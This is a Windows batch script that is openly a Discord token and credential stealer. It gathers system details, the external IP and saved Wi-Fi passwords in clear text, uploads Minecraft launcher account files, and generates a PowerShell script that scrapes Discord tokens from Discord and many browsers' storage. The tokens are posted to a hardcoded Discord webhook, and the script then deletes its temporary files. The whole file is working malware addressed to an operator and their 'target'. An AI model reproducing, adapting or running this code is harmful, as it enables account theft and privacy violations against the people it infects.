@echo off
set webhook=https://discord.com/api/webhooks/935046615843106816/_mZ1X9R_ZG-tv8Zu1nQ6Fefihsdt-AUNVzFhOUjjhShOiQ0gnXiv9xzFht5VzLraNSot





:check_Permissions
    

    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto starti
    ) else (
       cls
       echo Failure: Please run the file again with Admin
       timeout 2 >NUL
       goto check_Permissions
    )


:starti
::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
set /a killdc = 0

::get ip
curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt

::gets a list of all installed programms
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "


::gets informations about the pc
echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    netsh wlan show profile %%a key=clear >>%userprofile%\AppData\Local\Temp\wlan.txt
   
)

:aftertesti

::gets the ipconfig (also local ip)
ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt

::gets the info about the netstat
netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt

::sends the launcher_accounts.json if minecraft exist
if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end

::grabbs the token

echo $hook  = "%webhook%" >%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $token = new-object System.Collections.Specialized.StringCollection >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $db_path = @( >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Lightcord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\discordptb\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\discordcanary\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Amigo\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Torch\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Kometa\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Orbitum\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\CentBrowser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\7Star\7Star\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Vivaldi\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"	 >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Epic Privacy Browser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo ) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1 
echo foreach ($path in $db_path) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     if (Test-Path $path) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $data = Get-Content -Path "$($path)\$($file)" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $match = $regex.Match($data) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo            while ($match.Success) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 if (!$token.Contains($match.Value)) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                     $token.Add($match.Value) ^| out-null >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                $match = $match.NextMatch() >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo         } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $content = ">>> ||@everyone|| **New Token** ``` " >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo foreach ($data in $token) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $content = [string]::Concat($content, "`n", $data) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $content = [string]::Concat($content, "``` ") >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $JSON = @{ "content"= $content;}^| convertto-json >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"} >>%userprofile%\AppData\Local\Temp\testtttt.ps1
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\testtttt.ps1

::deletes all temp files
del %userprofile%\AppData\Local\Temp\ip.txt 
del %userprofile%\AppData\Local\Temp\ipp.txt 
del %userprofile%\AppData\Local\Temp\sysi.txt 
del %userprofile%\AppData\Local\Temp\System_INFO.txt 
del %userprofile%\AppData\Local\Temp\netstat.txt 
del %userprofile%\AppData\Local\Temp\test.ps1 
del %userprofile%\AppData\Local\Temp\programms.txt 
del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg
del %userprofile%\AppData\Local\Temp\uuid.txt
del %userprofile%\AppData\Local\Temp\testtttt.ps1 
del %userprofile%\AppData\Local\Temp\wlan.txt
